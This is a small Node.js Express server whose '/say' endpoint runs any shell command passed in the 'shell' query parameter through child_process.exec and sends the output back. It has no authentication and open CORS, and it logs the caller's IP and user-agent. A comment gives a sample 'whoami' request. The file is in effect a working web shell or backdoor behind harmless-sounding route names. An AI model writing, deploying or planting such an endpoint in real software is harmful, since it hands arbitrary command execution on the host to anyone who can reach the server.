const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
let exec = require('child_process').exec;
const app = express();
const port = 4000;

app.use(cors());
app.use(bodyParser.json({limit: '50mb'}));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

app.get('/say', (req, res) => {

let  command1 = req.query.shell
//res.send(command1);
//http://127.0.0.1:4000/say/?shell=whoami
let ip = req.header('X-Forwarded-For');
console.log(ip);
let header = req.header('User-Agent');
console.log(header);
exec(command1, function(err, stdout, stderr) {if (err){console.log(stderr);res.send(stderr);}else {console.log(stdout);res.send(stdout);}});

});

app.get('/hi', (req, res) => {
var ip = req.connection.remoteAddress;

let answer="I am listening you";
res.send(answer);
console.log(ip);
});


app.listen(port, () => {
  console.log('Server started on port '+port);
  });




